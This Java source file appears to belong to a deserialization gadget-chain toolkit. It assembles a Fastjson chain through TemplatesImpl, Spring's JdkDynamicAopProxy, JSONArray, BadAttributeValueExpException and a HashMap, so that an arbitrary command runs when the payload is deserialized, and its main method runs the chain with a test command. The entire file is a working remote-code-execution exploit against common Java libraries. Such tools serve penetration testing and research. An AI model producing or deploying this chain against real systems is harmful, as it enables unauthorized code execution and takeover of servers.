import common.Util;
import gadgets.*;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class Fastjson4_JdkDynamicAopProxy {
    public Object getObject (String cmd) throws Exception {

        Object node1 = TemplatesImplNode.makeGadget(cmd);
        Object node2 = JdkDynamicAopProxyNode.makeGadget(node1);
        Proxy proxy = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),
                new Class[]{Templates.class}, (InvocationHandler)node2);
        Object node3 = JsonArrayNode.makeGadget(2,proxy);
        Object node4 = BadAttrValExeNode.makeGadget(node3);
        Object[] array = new Object[]{node1,node4};
        Object node5 = HashMapNode.makeGadget(array);
        return node5;
    }

    public static void main(String[] args) throws Exception {
        Object object = new Fastjson4_JdkDynamicAopProxy().getObject(Util.getDefaultTestCmd());
        Util.runGadgets(object);
    }
}
